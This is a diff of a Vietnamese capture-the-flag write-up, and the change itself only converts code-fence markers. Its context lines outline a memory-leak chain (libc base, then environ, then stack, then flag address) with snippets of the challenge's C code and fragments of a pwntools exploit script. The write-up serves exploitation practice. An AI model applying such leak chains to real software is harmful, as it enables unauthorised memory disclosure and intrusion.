@@ -4,7 +4,7 @@
 Đây là biến toàn cục nằm sẵn trong libc. Bản thân ô nhớ của environ nằm ở vùng nhớ data/bss của libc, nhưng giá trị (value) được lưu bên trong ô nhớ đó lại là một địa chỉ tuyệt đối trỏ thẳng lên Stack (nơi lưu các biến môi trường của tiến trình).
 ## 1. Idea 
 Trong đề có : 
-'''c
+```c
 void read_file() {
   char file_buf[4096];
 
@@ -12,11 +12,11 @@ void read_file() {
   read(fd, file_buf, sizeof(file_buf) - 1);
   close(fd);
 }
-'''
+```
 -nhiệm vụ của ta là : leak libc base -> leak environ address -> leak stack address -> flag address
 -hàm phục vụ cho ta làm được điều đó là :
 
- '''c
+ ```c
  while (1) {
     printf("> ");
     scanf("%d", &idx);
@@ -30,10 +30,10 @@ void read_file() {
         break;
     }
   }
-'''
+```
 
 ## 2 script
-'''python
+```python
 #!/usr/bin/env python3
 from pwn import *
 
@@ -84,5 +84,7 @@ sla(b'> ',b'1')
 
 sla(b'Addr: ', f'{flag_address}'.encode())
 p.interactive()
-
+```
 '''
+
+```
